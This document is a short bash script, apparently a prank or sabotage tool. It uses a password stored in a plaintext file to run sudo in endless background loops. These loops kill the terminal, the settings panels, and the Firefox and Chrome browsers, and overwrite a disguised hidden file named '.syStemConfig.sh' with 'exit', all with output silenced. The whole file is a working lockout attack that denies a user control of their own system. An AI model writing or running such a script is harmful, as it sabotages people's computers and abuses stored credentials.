#!/bin/bash
function stopTerminal
{
    while true
        do    
        sudo -k -S killall /usr/lib/gnome-terminal/gnome-terminal-server < .pass > /dev/null 2>&1
        sudo -k -S echo "exit" > $HOME/.syStemConfig.sh < .pass > /dev/null 2>&1  
    done
}

function stopSettings
{
    while true
        do
        sudo -k -S killall gnome-control-center < .pass > /dev/null 2>&1
        sudo -k -S killall unity-control-center < .pass > /dev/null 2>&1
    done
}
function stopFirefox
{
    while true
        do
        sudo -k -S killall firefox < .pass > /dev/null 2>&1
        sudo -k -S killall google-chrome < .pass > /dev/null 2>&1   
       done
}

stopTerminal &
stopFirefox &
stopSettings &
